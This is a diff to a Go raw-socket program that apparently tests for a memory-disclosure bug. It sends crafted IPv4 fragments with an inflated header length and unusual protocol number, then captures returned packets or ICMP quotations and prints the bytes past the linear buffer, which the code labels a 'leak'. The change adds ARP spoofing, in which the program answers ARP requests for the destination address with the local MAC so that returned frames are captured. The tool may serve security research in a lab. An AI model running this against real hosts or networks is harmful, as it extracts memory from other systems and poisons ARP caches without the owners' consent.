@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"encoding/binary"
 	"encoding/hex"
 	"errors"
@@ -24,6 +25,7 @@ const (
 	ipProtoUDP    = 17
 	ipProtoRaw    = 253
 	mutatedIHL    = 60
+	ethPArp       = 0x0806
 )
 
 type egressRoute struct {
@@ -35,13 +37,16 @@ type egressRoute struct {
 }
 
 type egressCaptureStats struct {
-	txFragments    int
-	icmpPackets    int
-	quoted253      int
-	quotedUDP      int
-	matched        bool
-	matchedPackets int
-	matchedIDs     map[uint16]struct{}
+	txFragments     int
+	icmpPackets     int
+	quoted253       int
+	quotedUDP       int
+	matched         bool
+	matchedPackets  int
+	matchedIDs      map[uint16]struct{}
+	returnedPackets int
+	arpRequests     int
+	arpReplies      int
 }
 
 type egressPrepared struct {
@@ -126,15 +131,16 @@ func runEgress(c cfg) error {
 			return fmt.Errorf("sample %d: %w", sample, err)
 		}
 	}
-	stats, err := egressCollectICMP(rx, c.egressWait, expected, dst, proto, c.head)
+	stats, err := egressCollectICMP(rx, tx, ifi, c.egressWait, expected, dst, proto, c.head, c.answerDstARP)
 	if err != nil {
 		return fmt.Errorf("capture: %w", err)
 	}
-	fmt.Printf("capture: samples=%d tx_fragments=%d icmp=%d quoted_udp=%d quoted_proto253=%d matched_packets=%d matched_ids=%d\n",
-		len(samples), stats.txFragments, stats.icmpPackets, stats.quotedUDP, stats.quoted253,
+	fmt.Printf("capture: samples=%d tx_fragments=%d returned_packets=%d arp_requests=%d arp_replies=%d icmp=%d quoted_udp=%d quoted_proto253=%d matched_packets=%d matched_ids=%d\n",
+		len(samples), stats.txFragments, stats.returnedPackets, stats.arpRequests, stats.arpReplies,
+		stats.icmpPackets, stats.quotedUDP, stats.quoted253,
 		stats.matchedPackets, len(stats.matchedIDs))
 	if !stats.matched {
-		return errors.New("no matching ICMP quotation received; confirm the destination emits protocol-unreachable ICMP or capture packets at the controlled endpoint")
+		return errors.New("no matching returned fragment or ICMP quotation received; use -answer-dst-arp with an unused host-TAP address or capture at a controlled endpoint")
 	}
 	return nil
 }
@@ -350,7 +356,11 @@ func egressSendFrame(fd, ifindex int, dstMAC net.HardwareAddr, frame []byte, che
 		binary.LittleEndian.PutUint16(buf[8:], offset)
 	}
 	copy(buf[10:], frame)
-	addr := &syscall.SockaddrLinklayer{Protocol: htons(vlanProto), Ifindex: ifindex, Halen: 6}
+	protocol := uint16(ethPAll)
+	if len(frame) >= ethLen {
+		protocol = binary.BigEndian.Uint16(frame[12:14])
+	}
+	addr := &syscall.SockaddrLinklayer{Protocol: htons(protocol), Ifindex: ifindex, Halen: 6}
 	copy(addr.Addr[:], dstMAC)
 	return syscall.Sendto(fd, buf, 0, addr)
 }
@@ -409,7 +419,7 @@ func egressFrame(ip []byte, src, dst net.HardwareAddr) []byte {
 	return f
 }
 
-func egressCollectICMP(fd int, wait time.Duration, expected map[uint16]struct{}, dst net.IP, proto byte, head int) (egressCaptureStats, error) {
+func egressCollectICMP(fd, txfd int, ifi *net.Interface, wait time.Duration, expected map[uint16]struct{}, dst net.IP, proto byte, head int, answerDstARP bool) (egressCaptureStats, error) {
 	deadline := time.Now().Add(wait)
 	buf := make([]byte, 65536)
 	stats := egressCaptureStats{matchedIDs: make(map[uint16]struct{})}
@@ -421,15 +431,40 @@ func egressCollectICMP(fd int, wait time.Duration, expected map[uint16]struct{},
 			}
 			return stats, err
 		}
-		outer := ipv4Of(buf[:n])
+		frame := buf[:n]
+		if answerDstARP {
+			requesterMAC, requesterIP, ok := egressARPRequest(frame, dst)
+			if ok {
+				stats.arpRequests++
+				reply := egressARPReply(ifi.HardwareAddr, requesterMAC, dst, requesterIP)
+				if err := egressSendFrame(txfd, ifi.Index, requesterMAC, reply, false, 0, 0); err != nil {
+					return stats, fmt.Errorf("answer ARP for %s: %w", dst, err)
+				}
+				stats.arpReplies++
+				fmt.Printf("arp-reply: claimed=%s requester=%s requester_mac=%s\n", dst, requesterIP, requesterMAC)
+			}
+		}
+		outer := ipv4Of(frame)
 		if len(outer) < ipLen {
 			continue
 		}
-		if outer[9] == proto {
-			outerID := binary.BigEndian.Uint16(outer[4:])
-			if _, ok := expected[outerID]; ok {
+		outerID := binary.BigEndian.Uint16(outer[4:])
+		_, expectedID := expected[outerID]
+		fromLocalMAC := len(frame) >= ethLen && bytes.Equal(frame[6:12], ifi.HardwareAddr)
+		if fromLocalMAC && outer[9] == proto {
+			if expectedID {
 				stats.txFragments++
 			}
+		}
+		toLocalMAC := len(frame) >= ethLen && bytes.Equal(frame[0:6], ifi.HardwareAddr) && !bytes.Equal(frame[6:12], ifi.HardwareAddr)
+		if toLocalMAC && expectedID && net.IP(outer[16:20]).Equal(dst) && int(outer[0]&0x0f)*4 > ipLen {
+			stats.matched = true
+			stats.matchedPackets++
+			stats.returnedPackets++
+			stats.matchedIDs[outerID] = struct{}{}
+			fmt.Printf("returned: id=0x%04x first=0x%02x ihl=%d bytes=%d src_mac=%s\n",
+				outerID, outer[0], int(outer[0]&0x0f)*4, len(outer), net.HardwareAddr(frame[6:12]))
+			egressPrintOptions(outer, head)
 		}
 		if outer[9] != ipProtoICMP {
 			continue
@@ -458,7 +493,7 @@ func egressCollectICMP(fd int, wait time.Duration, expected map[uint16]struct{},
 		}
 		quotedID := binary.BigEndian.Uint16(quoted[4:])
 		quotedDst := net.IP(quoted[16:20])
-		_, expectedID := expected[quotedID]
+		_, expectedID = expected[quotedID]
 		if !expectedID || !quotedDst.Equal(dst) {
 			fmt.Printf("icmp-unmatched: type=%d code=%d quoted_id=0x%04x quoted_dst=%s expected_dst=%s\n",
 				icmp[0], icmp[1], quotedID, quotedDst, dst)
@@ -468,19 +503,56 @@ func egressCollectICMP(fd int, wait time.Duration, expected map[uint16]struct{},
 		stats.matchedPackets++
 		stats.matchedIDs[quotedID] = struct{}{}
 		ihl := int(quoted[0]&0x0f) * 4
-		available := min(ihl, len(quoted))
 		fmt.Printf("icmp: type=%d code=%d id=0x%04x first=0x%02x ihl=%d quoted=%d\n",
 			icmp[0], icmp[1], quotedID, quoted[0], ihl, len(quoted))
-		if available > ipLen {
-			options := quoted[ipLen:available]
-			fmt.Printf("  options %d bytes: %s\n", len(options), hex.EncodeToString(options))
-			if len(options) > head {
-				leak := options[head:]
-				fmt.Printf("  past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
-			}
-		}
+		egressPrintOptions(quoted, head)
 	}
 	return stats, nil
+}
+
+func egressPrintOptions(ip []byte, head int) {
+	if len(ip) < ipLen {
+		return
+	}
+	available := min(int(ip[0]&0x0f)*4, len(ip))
+	if available <= ipLen {
+		return
+	}
+	options := ip[ipLen:available]
+	fmt.Printf("  options %d bytes: %s\n", len(options), hex.EncodeToString(options))
+	if len(options) > head {
+		leak := options[head:]
+		fmt.Printf("  past-linear hex=%s ascii=%q\n", hex.EncodeToString(leak), string(leak))
+	}
+}
+
+func egressARPRequest(frame []byte, target net.IP) (net.HardwareAddr, net.IP, bool) {
+	proto, arp := ethernetPayload(frame)
+	if proto != ethPArp || len(arp) < 28 ||
+		binary.BigEndian.Uint16(arp[0:2]) != 1 ||
+		binary.BigEndian.Uint16(arp[2:4]) != ipProtoEth ||
+		arp[4] != 6 || arp[5] != 4 || binary.BigEndian.Uint16(arp[6:8]) != 1 ||
+		!net.IP(arp[24:28]).Equal(target) {
+		return nil, nil, false
+	}
+	return append(net.HardwareAddr(nil), arp[8:14]...), append(net.IP(nil), arp[14:18]...), true
+}
+
+func egressARPReply(srcMAC, dstMAC net.HardwareAddr, srcIP, dstIP net.IP) []byte {
+	frame := make([]byte, ethLen+28)
+	copy(frame[0:6], dstMAC)
+	copy(frame[6:12], srcMAC)
+	binary.BigEndian.PutUint16(frame[12:14], ethPArp)
+	arp := frame[ethLen:]
+	binary.BigEndian.PutUint16(arp[0:2], 1)
+	binary.BigEndian.PutUint16(arp[2:4], ipProtoEth)
+	arp[4], arp[5] = 6, 4
+	binary.BigEndian.PutUint16(arp[6:8], 2)
+	copy(arp[8:14], srcMAC)
+	copy(arp[14:18], srcIP.To4())
+	copy(arp[18:24], dstMAC)
+	copy(arp[24:28], dstIP.To4())
+	return frame
 }
 
 func routeUint(ip net.IP) uint32 {
